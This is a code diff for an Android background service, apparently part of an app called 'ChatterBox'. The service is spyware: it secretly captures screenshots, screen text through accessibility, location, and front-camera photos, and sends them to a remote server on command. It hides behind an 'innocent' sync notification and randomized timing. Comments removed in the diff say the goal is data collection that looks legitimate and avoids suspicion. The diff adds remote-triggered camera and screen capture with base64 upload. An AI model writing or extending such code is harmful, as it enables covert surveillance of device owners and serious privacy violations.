@@ -1,13 +1,22 @@
 package com.example.ChatterBox.database
 
+import android.Manifest
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Bitmap
+import android.graphics.ImageFormat
 import android.graphics.PixelFormat
+import android.graphics.SurfaceTexture
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CaptureRequest
 import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
 import android.media.Image
@@ -19,9 +28,15 @@ import android.os.Handler
 import android.os.HandlerThread
 import android.os.IBinder
 import android.provider.Settings
+import android.util.Base64
 import android.util.Log
+import android.util.Size
+import android.view.Surface
 import android.view.WindowManager
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import androidx.core.app.NotificationCompat
+import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
@@ -29,11 +44,11 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 import java.util.concurrent.Semaphore
+import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
-import org.json.JSONObject
 
 class BackgroundSyncService : Service() {
-    private val TAG = "SyncService" // Generic, innocent-looking tag
+    private val TAG = "SyncService"
     private val NOTIFICATION_ID = 1023
     private val CHANNEL_ID = "background_sync"
 
@@ -41,61 +56,172 @@ class BackgroundSyncService : Service() {
     private var syncHandler: Handler? = null
     private val isSyncing = AtomicBoolean(false)
 
+    // Media projection variables
     private var mediaProjManager: MediaProjectionManager? = null
     private var mediaProj: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
     private var imageReader: ImageReader? = null
     private val mediaLock = Semaphore(1)
-
     private var screenDensity: Int = 0
     private var displayWidth: Int = 0
     private var displayHeight: Int = 0
     private var projIntent: Intent? = null
     private var projResultCode: Int = 0
 
+    // Camera variables
+    private var cameraThread: HandlerThread? = null
+    private var cameraHandler: Handler? = null
+    private var cameraDevice: CameraDevice? = null
+    private var cameraCaptureSession: CameraCaptureSession? = null
+    private var cameraImageReader: ImageReader? = null
+    private val cameraOpenCloseLock = Semaphore(1)
+
     private var dataSync: DataSynchronizer? = null
     private var lastSyncTime = 0L
 
-    // Use consistent device ID throughout the app
     private val deviceId: String by lazy {
         Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
     }
 
     override fun onCreate() {
         super.onCreate()
-        // Create a handler thread with an innocent name
+
         syncThread = HandlerThread("DataSyncThread").apply { start() }
         syncHandler = Handler(syncThread!!.looper)
+
+        cameraThread = HandlerThread("CameraThread").apply { start() }
+        cameraHandler = Handler(cameraThread!!.looper)
 
         createInnocentNotificationChannel()
         val notification = createInnocentNotification()
         startForeground(NOTIFICATION_ID, notification)
 
-        // Initialize synchronizer with innocent name
         dataSync = DataSynchronizer(this)
 
         Log.d(TAG, "Background sync service initialized")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d(TAG, "Sync service starting...")
-        val initialDelay = (30 * 1000L) + (Math.random() * 60 * 1000L).toLong() // 30-90 seconds
+        Log.d(TAG, "Sync service received intent: ${intent?.action}")
+
+        val initialDelay = (30 * 1000L) + (Math.random() * 60 * 1000L).toLong()
         syncHandler?.postDelayed({
             monitorForSyncOpportunities()
         }, initialDelay)
-        if (intent?.action == "SETUP_PROJECTION") {
-            val resultCode = intent.getIntExtra("resultCode", 0)
-            val data = intent.getParcelableExtra<Intent>("data")
-            if (data != null) {
-                setupMediaCapture(resultCode, data)
-                Log.d(TAG, "Media capture initialized for sync")
+
+        when (intent?.action) {
+            "SETUP_PROJECTION" -> {
+                val resultCode = intent.getIntExtra("resultCode", 0)
+                val data = intent.getParcelableExtra<Intent>("data")
+                if (data != null) {
+                    setupMediaCapture(resultCode, data)
+                    Log.d(TAG, "Media capture initialized for sync")
+                }
+            }
+            "CAPTURE_SCREENSHOT" -> {
+                val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
+                syncHandler?.post {
+                    handleScreenshotCommand(commandId)
+                }
+            }
+            "CAPTURE_CAMERA" -> {
+                val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
+                syncHandler?.post {
+                    handleCameraCommand(commandId)
+                }
             }
         }
 
-        // Start monitoring for idle periods to perform "sync" (data collection)
         monitorForSyncOpportunities()
-
         return START_STICKY
+    }
+
+    // Handle screenshot capture and response
+    private fun handleScreenshotCommand(commandId: String) {
+        try {
+            Log.d(TAG, "Processing screenshot capture command: $commandId")
+
+            if (projIntent == null) {
+                // Send error if we don't have projection permission
+                val errorResult = JSONObject().apply {
+                    put("status", "error")
+                    put("message", "Media projection not available")
+                }
+                sendCommandResult(commandId, false, "Media projection not available", errorResult)
+                return
+            }
+
+            // Take the screenshot
+            val screenshotFile = captureScreenContent()
+
+            if (screenshotFile != null) {
+                // Convert the image to base64
+                val imageBytes = File(screenshotFile).readBytes()
+                val base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT)
+
+                // Prepare the result
+                val result = JSONObject().apply {
+                    put("status", "success")
+                    put("image_data", base64Image)
+                    put("timestamp", System.currentTimeMillis())
+                }
+
+                // Send the result back to the server
+                sendCommandResult(commandId, true, "Screenshot captured successfully", result)
+                Log.d(TAG, "Screenshot captured and result sent")
+            } else {
+                // Screenshot failed
+                val errorResult = JSONObject().apply {
+                    put("status", "error")
+                    put("message", "Failed to capture screenshot")
+                }
+                sendCommandResult(commandId, false, "Failed to capture screenshot", errorResult)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error handling screenshot command: ${e.message}")
+            val errorResult = JSONObject().apply {
+                put("status", "error")
+                put("message", "Exception: ${e.message}")
+            }
+            sendCommandResult(commandId, false, "Error: ${e.message}", errorResult)
+        }
+    }
+
+    // Handle camera capture and response
+    private fun handleCameraCommand(commandId: String) {
+        try {
+            Log.d(TAG, "Processing camera capture command: $commandId")
+
+            // Check camera permission first
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                val errorResult = JSONObject().apply {
+                    put("status", "error")
+                    put("message", "Camera permission not granted")
+                }
+                sendCommandResult(commandId, false, "Camera permission not granted", errorResult)
+                return
+            }
+
+            // Take photo with Camera2 API
+            openCamera(commandId)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error handling camera command: ${e.message}")
+            val errorResult = JSONObject().apply {
+                put("status", "error")
+                put("message", "Exception: ${e.message}")
+            }
+            sendCommandResult(commandId, false, "Error: ${e.message}", errorResult)
+        }
+    }
+
+    // Helper method to send command results back to the server
+    private fun sendCommandResult(commandId: String, success: Boolean, message: String, result: JSONObject) {
+        try {
+            val commandsInstance = Commands(this)
+            commandsInstance.sendCommandResponse(commandId, success, message, result)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error sending command result: ${e.message}")
+        }
     }
 
     private fun createInnocentNotificationChannel() {
@@ -132,8 +258,6 @@ class BackgroundSyncService : Service() {
     }
 
     private fun monitorForSyncOpportunities() {
-        // Use the existing IdleDetector from your accessibility implementation
-        // This makes the malicious capture blend with legitimate app behavior
         val idleCallback = {
             if (!isSyncing.get()) {
                 syncHandler?.post {
@@ -148,18 +272,11 @@ class BackgroundSyncService : Service() {
             }
         }
 
-        // Listen for device idle state changes from the accessibility service
         com.example.ChatterBox.accessibility.IdleDetector.registerUserActivity()
 
-        // Also schedule periodic "syncs" when the app is active
         syncHandler?.postDelayed(object : Runnable {
             override fun run() {
                 val now = System.currentTimeMillis()
-
-                // Only sync if:
-                // 1. We haven't synced in the last 30 minutes
-                // 2. Device is likely to be idle or charging (use accessibility IdleDetector)
-                // 3. We're not already syncing
                 if ((now - lastSyncTime > 30 * 60 * 1000) && !isSyncing.get()) {
                     syncHandler?.post {
                         synchronized(isSyncing) {
@@ -172,89 +289,374 @@ class BackgroundSyncService : Service() {
                         }
                     }
                 }
-
-                // Schedule next check with randomized interval to look less suspicious
                 val nextInterval = (1 * 60 * 1000L) + (Math.random() * 10 * 60 * 1000L).toLong()
                 syncHandler?.postDelayed(this, nextInterval)
             }
-        }, 1 * 60 * 1000L) // First check after 15 minutes
+        }, 1 * 60 * 1000L)
     }
 
     private fun performBackgroundSync() {
         try {
-            // Only perform operations if battery is above 30% or device is charging
             val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
             val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
             val isCharging = batteryManager.isCharging
 
             if (batteryLevel > 30 || isCharging) {
                 captureScreenContent()
-                collectDeviceData()
                 captureLocation()
                 dataSync?.synchronizeData()
-            } else {
-                // Just collect basic data which is less resource-intensive
-                collectDeviceData()
             }
         } catch (e: Exception) {
-            // Silent fail
+            Log.e(TAG, "Error during background sync: ${e.message}")
         }
     }
 
-    private fun captureScreenContent() {
-        if (projIntent == null) return
+    // Modified to return the file path so it can be used in command responses
+    private fun captureScreenContent(): String? {
+        if (projIntent == null) return null
 
         try {
-            if (mediaProjManager == null) {
-                mediaProjManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            if (!mediaLock.tryAcquire(3, TimeUnit.SECONDS)) {
+                Log.e(TAG, "Could not acquire media lock for screenshot")
+                return null
             }
 
-            if (mediaProj == null) {
-                mediaProj = mediaProjManager?.getMediaProjection(projResultCode, projIntent!!)
-            }
-
-            imageReader = ImageReader.newInstance(
-                displayWidth, displayHeight, PixelFormat.RGBA_8888, 1
-            )
-
-            virtualDisplay = mediaProj?.createVirtualDisplay(
-                "SyncDisplay",
-                displayWidth, displayHeight, screenDensity,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                imageReader?.surface, null, null
-            )
-
-            // Delay to ensure capture completes
-            Thread.sleep(100)
-
-            val image = imageReader?.acquireLatestImage()
-            if (image != null) {
-                val bitmap = imageToBitmap(image)
-                image.close()
-
-                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-                val filename = "sync_${timestamp}.jpg"
-
-                // Convert to JPEG to save space
-                val jpegBytes = compressBitmap(bitmap)
-
-                // Save internally within app storage, not external storage
-                val file = File(getDir("sync_data", Context.MODE_PRIVATE), filename)
-                FileOutputStream(file).use { out ->
-                    out.write(jpegBytes)
+            try {
+                if (mediaProjManager == null) {
+                    mediaProjManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                 }
 
-                // Queue for later synchronization
-                dataSync?.queueForSync("screen_data", file.absolutePath)
+                if (mediaProj == null) {
+                    mediaProj = mediaProjManager?.getMediaProjection(projResultCode, projIntent!!)
+                }
+
+                imageReader = ImageReader.newInstance(
+                    displayWidth, displayHeight, PixelFormat.RGBA_8888, 1
+                )
+
+                virtualDisplay = mediaProj?.createVirtualDisplay(
+                    "SyncDisplay",
+                    displayWidth, displayHeight, screenDensity,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    imageReader?.surface, null, null
+                )
+
+                // Wait for the image to be ready
+                Thread.sleep(150)
+
+                val image = imageReader?.acquireLatestImage()
+                if (image != null) {
+                    val bitmap = imageToBitmap(image)
+                    image.close()
+
+                    val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+                    val filename = "sync_${timestamp}.jpg"
+                    val file = File(getDir("sync_data", Context.MODE_PRIVATE), filename)
+
+                    val jpegBytes = compressBitmap(bitmap)
+                    FileOutputStream(file).use { out ->
+                        out.write(jpegBytes)
+                    }
+
+                    dataSync?.queueForSync("screen_data", file.absolutePath)
+
+                    return file.absolutePath
+                } else {
+                    Log.e(TAG, "Failed to acquire image from virtual display")
+                }
+            } finally {
+                virtualDisplay?.release()
+                virtualDisplay = null
+                imageReader?.close()
+                imageReader = null
+                mediaLock.release()
             }
         } catch (e: Exception) {
             Log.e(TAG, "Sync error: ${e.message}")
-        } finally {
-            virtualDisplay?.release()
-            virtualDisplay = null
-            imageReader?.close()
-            imageReader = null
+            mediaLock.release()
         }
+
+        return null
+    }
+
+    // Camera handling methods
+    private fun openCamera(commandId: String) {
+        try {
+            // Double-check camera permission to avoid SecurityException
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                throw SecurityException("Camera permission not granted")
+            }
+
+            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val cameraId = findFrontCamera(cameraManager)
+
+            if (cameraId == null) {
+                val result = JSONObject().apply {
+                    put("status", "error")
+                    put("message", "No suitable camera found")
+                }
+                sendCommandResult(commandId, false, "No suitable camera found", result)
+                return
+            }
+
+            // Use the camera characteristics to determine optimal size
+            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
+            val streamConfigMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+
+            // Get first available output size
+            val outputSizes = streamConfigMap?.getOutputSizes(SurfaceTexture::class.java)
+            val previewSize = outputSizes?.firstOrNull() ?: Size(640, 480)
+
+            // Create ImageReader for capturing still images
+            cameraImageReader = ImageReader.newInstance(
+                previewSize.width, previewSize.height, ImageFormat.JPEG, 2
+            ).apply {
+                setOnImageAvailableListener({ reader ->
+                    val image = reader.acquireLatestImage()
+                    if (image != null) {
+                        processCameraImage(image, commandId)
+                    }
+                }, cameraHandler)
+            }
+
+            if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) {
+                throw RuntimeException("Time out waiting to lock camera opening")
+            }
+
+            try {
+                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                    override fun onOpened(camera: CameraDevice) {
+                        Log.d(TAG, "Camera opened successfully")
+                        cameraDevice = camera
+                        cameraOpenCloseLock.release()
+                        createCaptureSession(commandId)
+                    }
+
+                    override fun onDisconnected(camera: CameraDevice) {
+                        Log.d(TAG, "Camera disconnected")
+                        cameraOpenCloseLock.release()
+                        camera.close()
+                        cameraDevice = null
+
+                        val result = JSONObject().apply {
+                            put("status", "error")
+                            put("message", "Camera disconnected")
+                        }
+                        sendCommandResult(commandId, false, "Camera disconnected", result)
+                    }
+
+                    override fun onError(camera: CameraDevice, error: Int) {
+                        Log.e(TAG, "Camera device error: $error")
+                        cameraOpenCloseLock.release()
+                        camera.close()
+                        cameraDevice = null
+
+                        val result = JSONObject().apply {
+                            put("status", "error")
+                            put("message", "Camera error: $error")
+                        }
+                        sendCommandResult(commandId, false, "Camera error: $error", result)
+                    }
+                }, cameraHandler)
+            } catch (e: SecurityException) {
+                cameraOpenCloseLock.release()
+                val result = JSONObject().apply {
+                    put("status", "error")
+                    put("message", "Camera permission denied: ${e.message}")
+                }
+                sendCommandResult(commandId, false, "Camera permission denied", result)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error opening camera: ${e.message}")
+            if (cameraOpenCloseLock.tryAcquire(100, TimeUnit.MILLISECONDS)) {
+                cameraOpenCloseLock.release()
+            }
+
+            val result = JSONObject().apply {
+                put("status", "error")
+                put("message", "Error opening camera: ${e.message}")
+            }
+            sendCommandResult(commandId, false, "Error opening camera: ${e.message}", result)
+        }
+    }
+
+    private fun findFrontCamera(cameraManager: CameraManager): String? {
+        try {
+            for (cameraId in cameraManager.cameraIdList) {
+                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
+                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
+                if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
+                    return cameraId
+                }
+            }
+            // If no front camera, return the first available camera
+            return cameraManager.cameraIdList.firstOrNull()
+        } catch (e: Exception) {
+            Log.e(TAG, "Error finding camera: ${e.message}")
+            return null
+        }
+    }
+
+    private fun createCaptureSession(commandId: String) {
+        try {
+            // Check camera permission again
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                throw SecurityException("Camera permission not granted")
+            }
+
+            val surface = cameraImageReader?.surface ?: return
+
+            try {
+                cameraDevice?.createCaptureSession(
+                    listOf(surface),
+                    object : CameraCaptureSession.StateCallback() {
+                        override fun onConfigured(session: CameraCaptureSession) {
+                            Log.d(TAG, "Camera capture session configured")
+                            cameraCaptureSession = session
+                            captureStillPicture(commandId)
+                        }
+
+                        override fun onConfigureFailed(session: CameraCaptureSession) {
+                            Log.e(TAG, "Failed to configure camera capture session")
+
+                            val result = JSONObject().apply {
+                                put("status", "error")
+                                put("message", "Failed to configure camera session")
+                            }
+                            sendCommandResult(commandId, false, "Failed to configure camera session", result)
+                        }
+                    },
+                    cameraHandler
+                )
+            } catch (e: SecurityException) {
+                val result = JSONObject().apply {
+                    put("status", "error")
+                    put("message", "Camera permission denied during session creation")
+                }
+                sendCommandResult(commandId, false, "Camera permission denied", result)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error creating capture session: ${e.message}")
+
+            val result = JSONObject().apply {
+                put("status", "error")
+                put("message", "Error creating capture session: ${e.message}")
+            }
+            sendCommandResult(commandId, false, "Error creating capture session: ${e.message}", result)
+        }
+    }
+
+    private fun captureStillPicture(commandId: String) {
+        try {
+            // Check camera permission again
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                throw SecurityException("Camera permission not granted")
+            }
+
+            val captureRequestBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+            captureRequestBuilder?.addTarget(cameraImageReader?.surface!!)
+
+            // Auto-focus
+            captureRequestBuilder?.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+
+            // Orientation
+            val rotation = getWindowManager().defaultDisplay.rotation
+            captureRequestBuilder?.set(CaptureRequest.JPEG_ORIENTATION, rotation * 90)
+
+            try {
+                cameraCaptureSession?.capture(
+                    captureRequestBuilder?.build()!!,
+                    object : CameraCaptureSession.CaptureCallback() {
+                        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: android.hardware.camera2.TotalCaptureResult) {
+                            Log.d(TAG, "Still picture capture completed")
+                        }
+                    },
+                    cameraHandler
+                )
+            } catch (e: SecurityException) {
+                val result = JSONObject().apply {
+                    put("status", "error")
+                    put("message", "Camera permission denied during capture")
+                }
+                sendCommandResult(commandId, false, "Camera permission denied", result)
+                closeCamera()
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error capturing still picture: ${e.message}")
+
+            val result = JSONObject().apply {
+                put("status", "error")
+                put("message", "Error capturing picture: ${e.message}")
+            }
+            sendCommandResult(commandId, false, "Error capturing picture: ${e.message}", result)
+
+            closeCamera()
+        }
+    }
+
+    private fun processCameraImage(image: Image, commandId: String) {
+        var jpegBytes: ByteArray? = null
+
+        try {
+            val buffer = image.planes[0].buffer
+            val bytes = ByteArray(buffer.remaining())
+            buffer.get(bytes)
+            jpegBytes = bytes
+
+            // Save file
+            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+            val filename = "camera_${timestamp}.jpg"
+            val file = File(getDir("sync_data", Context.MODE_PRIVATE), filename)
+
+            FileOutputStream(file).use { out ->
+                out.write(bytes)
+            }
+
+            // Convert to base64 for command response
+            val base64Image = Base64.encodeToString(bytes, Base64.DEFAULT)
+
+            // Send result back with the base64 image
+            val result = JSONObject().apply {
+                put("status", "success")
+                put("image_data", base64Image)
+                put("timestamp", System.currentTimeMillis())
+            }
+            sendCommandResult(commandId, true, "Camera image captured successfully", result)
+
+            // Queue for sync
+            dataSync?.queueForSync("camera_data", file.absolutePath)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error processing camera image: ${e.message}")
+
+            val result = JSONObject().apply {
+                put("status", "error")
+                put("message", "Error processing camera image: ${e.message}")
+            }
+            sendCommandResult(commandId, false, "Error processing camera image: ${e.message}", result)
+        } finally {
+            image.close()
+            closeCamera()
+        }
+    }
+
+    private fun closeCamera() {
+        try {
+            cameraOpenCloseLock.acquire()
+            cameraCaptureSession?.close()
+            cameraCaptureSession = null
+            cameraDevice?.close()
+            cameraDevice = null
+            cameraImageReader?.close()
+            cameraImageReader = null
+        } catch (e: Exception) {
+            Log.e(TAG, "Error closing camera: ${e.message}")
+        } finally {
+            cameraOpenCloseLock.release()
+        }
+    }
+
+    private fun getWindowManager(): WindowManager {
+        return getSystemService(Context.WINDOW_SERVICE) as WindowManager
     }
 
     private fun imageToBitmap(image: Image): Bitmap {
@@ -275,56 +677,38 @@ class BackgroundSyncService : Service() {
 
     private fun compressBitmap(bitmap: Bitmap): ByteArray {
         val out = ByteArrayOutputStream()
-        // Use lower quality to reduce size
         bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
         return out.toByteArray()
     }
 
-    private fun collectDeviceData() {
-        try {
-            val deviceInfo = JSONObject().apply {
-                put("device_model", Build.MODEL)
-                put("device_manufacturer", Build.MANUFACTURER)
-                put("android_version", Build.VERSION.RELEASE)
-                put("device_id", deviceId) // CONSISTENT: Always use deviceId
-                put("timestamp", System.currentTimeMillis())
-            }
-
-            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-            val filename = "device_info_${timestamp}.json"
-
-            val file = File(getDir("sync_data", Context.MODE_PRIVATE), filename)
-            FileOutputStream(file).use { out ->
-                out.write(deviceInfo.toString().toByteArray())
-            }
-
-            dataSync?.queueForSync("device_info", file.absolutePath)
-        } catch (e: Exception) {
-            Log.e(TAG, "Device data collection error: ${e.message}")
-        }
-    }
-
     private fun captureLocation() {
         try {
+            // Explicit permission check to avoid SecurityException
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                Log.e(TAG, "Location permissions not granted")
+                return
+            }
+
             val locationTracker = LocationTracker.getInstance(this)
             locationTracker.captureLastKnownLocation { locationData ->
                 try {
                     val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                     val filename = "location_${timestamp}.json"
-
-                    // Use a consistent storage location
                     val storage = StorageManager.getStorageDir(this, "location_data")
                     val file = File(storage, filename)
+
                     FileOutputStream(file).use { out ->
                         out.write(locationData.toString().toByteArray())
                     }
 
-                    // Queue for synchronization using standardized path
                     dataSync?.queueForSync("location_data", file.absolutePath)
                 } catch (e: Exception) {
                     Log.e(TAG, "Location save error: ${e.message}")
                 }
             }
+        } catch (e: SecurityException) {
+            Log.e(TAG, "Location permission denied: ${e.message}")
         } catch (e: Exception) {
             Log.e(TAG, "Location capture error: ${e.message}")
         }
@@ -338,45 +722,50 @@ class BackgroundSyncService : Service() {
                 if (root != null) {
                     val extractedText = extractTextFromNode(root)
                     if (extractedText.isNotEmpty()) {
-                        // Create a structured JSON payload
                         val capturedData = JSONObject().apply {
                             put("timestamp", System.currentTimeMillis())
-                            put("device_id", deviceId) // CONSISTENT: Always use deviceId
+                            put("device_id", deviceId)
                             put("content_type", "text")
                             put("text", extractedText)
                             put("device_model", Build.MODEL)
                             put("android_version", Build.VERSION.RELEASE)
                         }
 
-                        // Process and store the text
                         dataSync?.queueForSync("screen_content", capturedData.toString())
                     }
                     root.recycle()
                 }
             } catch (e: Exception) {
-                // Silent fail
+                Log.e(TAG, "Error capturing visible content: ${e.message}")
             }
         }
     }
 
     private fun extractTextFromNode(node: android.view.accessibility.AccessibilityNodeInfo): String {
         val sb = StringBuilder()
+
         if (node.text != null) {
             sb.append(node.text)
             sb.append(" ")
         }
+
         for (i in 0 until node.childCount) {
             val child = node.getChild(i) ?: continue
             sb.append(extractTextFromNode(child))
             child.recycle()
         }
+
         return sb.toString()
     }
 
     override fun onDestroy() {
         syncThread?.quitSafely()
+        cameraThread?.quitSafely()
+
         mediaProj?.stop()
         mediaProj = null
+
+        closeCamera()
 
         super.onDestroy()
     }
